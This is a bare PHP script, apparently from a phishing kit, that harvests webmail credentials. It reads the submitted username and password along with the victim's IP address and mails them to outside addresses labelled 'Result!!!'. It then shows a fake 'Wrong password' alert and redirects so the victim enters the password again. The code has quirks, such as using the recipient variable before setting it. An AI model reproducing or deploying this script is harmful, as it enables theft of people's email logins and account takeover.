<?php
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "Webmail Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$try.= $_POST['try']+1;
$a = "error.php?email=".$_POST['user']."&try=".$try;
$b = "index.php?email=".$_POST['user']."&try=".$try;
mail($recipient,$ip,$message);

$recipient = "resulter1000@protonmail.com, sales@genclerrnermer.com";
$subject = "Result!!!";
$headers = "From: webmail <mofiz@banglamail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$ip,$message,$headers)) 

{ 
	if($try<=0) {     
	
		   echo "<script type='text/javascript'>
		   window.location='$a';
		   </script>";
}
	else {
		?>

		   <script language=javascript>
alert('Wrong password. Please try again later');
window.location='<?php echo $b ?>';
</script>
<?
	}

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>